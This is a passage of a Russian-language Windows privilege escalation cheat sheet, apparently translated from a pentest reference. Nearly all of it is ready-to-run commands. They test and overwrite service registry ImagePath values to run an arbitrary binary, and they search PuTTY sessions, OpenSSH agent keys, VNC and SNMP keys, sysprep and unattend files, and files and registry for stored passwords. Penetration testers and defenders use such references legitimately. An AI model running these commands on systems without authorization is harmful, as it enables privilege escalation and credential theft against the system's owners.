## Разрешения на изменение реестра служб

Вы должны проверить, можете ли вы изменить реестр какой-либо службы. Вы можете **проверить** свои **разрешения** в **реестре служб,** выполнив:

```
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Проверьте, есть ли у **аутентифицированных пользователей** или **NT AUTHORITY\INTERACTIVE** полный контроль. В этом случае вы можете изменить двоичный файл, который будет выполняться службой.

Чтобы изменить путь исполняемого файла:

```
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

# Приложения

## Установленные приложения

Проверьте **права доступа к двоичным файлам** (возможно, вы сможете перезаписать один из них и повысить привилегии) и к **папкам** ( [захват DLL](/windows-hardening/windows-local-privilege-escalation/dll-hijacking) ).

```
dir /a "C:\Program Files"

dir /a "C:\Program Files (x86)"

reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime

Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

# Файлы и реестр (учетные данные)

```
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

## Ключи хоста Putty SSH

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

## Ключи SSH в реестре

Закрытые ключи SSH могут храниться внутри раздела реестра `HKCU\Software\OpenSSH\Agent\Keys`, поэтому вам следует проверить, есть ли там что-нибудь интересное:

```
reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
```

Если вы найдете какую-либо запись внутри этого пути, вероятно, это будет сохраненный ключ SSH. Он хранится в зашифрованном виде, но его можно легко расшифровать с помощью [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) . Подробнее об этом методе здесь:[](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Если `ssh-agent`служба не запущена и вы хотите, чтобы она автоматически запускалась при загрузке:

```
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

## Оставленные без присмотра файлы

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

## Внутри реестра

**Возможные ключи реестра с учетными данными**

```
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

## **Общий поиск пароля в файлах и реестре**

**Поиск содержимого файла**

```
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

Поиск файла с определенным именем файла

```
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

Найдите в реестре имена ключей и пароли.

```
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```